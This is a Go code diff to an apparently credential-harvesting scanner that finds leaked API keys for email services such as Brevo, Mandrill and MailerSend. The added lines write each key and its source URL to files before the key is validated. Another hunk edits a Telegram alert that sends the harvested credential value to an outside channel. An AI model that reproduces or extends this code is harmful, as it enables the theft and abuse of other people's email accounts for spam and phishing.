@@ -3124,6 +3124,10 @@ func (a *AWSScanner) CheckBrevo(key, sourceURL string) bool {
 	globalCounters.APIsFoundTotal++
 	globalCounters.mu.Unlock()
 
+	// Save on first match so credential is not lost if API validation fails.
+	a.logFound("Brevo", key, sourceURL)
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "brevo_found.txt")
+
 	req, _ := http.NewRequest("GET", "https://api.brevo.com/v3/account", nil)
 	req.Header.Set("api-key", key)
 
@@ -3183,6 +3187,9 @@ func (a *AWSScanner) CheckXSMTP(key, sourceURL string) bool {
 	globalCounters.mu.Lock()
 	globalCounters.APIsFoundTotal++
 	globalCounters.mu.Unlock()
+
+	a.logFound("XSMTP", key, sourceURL)
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "xsmtp_found.txt")
 
 	req, _ := http.NewRequest("GET", "https://api.xsmtp.com/v1/account", nil)
 	req.Header.Set("api-key", key)
@@ -3261,6 +3268,9 @@ func (a *AWSScanner) CheckMandrill(key, sourceURL string) bool {
 	globalCounters.APIsFoundTotal++
 	globalCounters.mu.Unlock()
 
+	a.logFound("Mandrill", key, sourceURL)
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "mandrill_found.txt")
+
 	payload := map[string]string{"key": key}
 	jsonPayload, _ := json.Marshal(payload)
 	req, _ := http.NewRequest("POST", "https://mandrillapp.com/api/1.0/users/info.json", bytes.NewReader(jsonPayload))
@@ -3315,6 +3325,9 @@ func (a *AWSScanner) CheckMailerSend(key, sourceURL string) bool {
 	globalCounters.mu.Lock()
 	globalCounters.APIsFoundTotal++
 	globalCounters.mu.Unlock()
+
+	a.logFound("MailerSend", key, sourceURL)
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "mailersend_found.txt")
 
 	req, _ := http.NewRequest("GET", "https://api.mailersend.com/v1/domains", nil)
 	req.Header.Set("Authorization", "Bearer "+key)
@@ -3687,7 +3700,7 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 					if len(displayKey) > 100 {
 						displayKey = displayKey[:100] + "..."
 					}
-					msg := a.tgHit("🔍", check.Name+" HIT", sourceURL) + fmt.Sprintf(
+					msg := a.tgHit("🔍", check.Name, sourceURL) + fmt.Sprintf(
 						"\n🆔 CREDENTIALS\nValue : %s\n", displayKey)
 					go a.sendTelegram(msg)
 				}
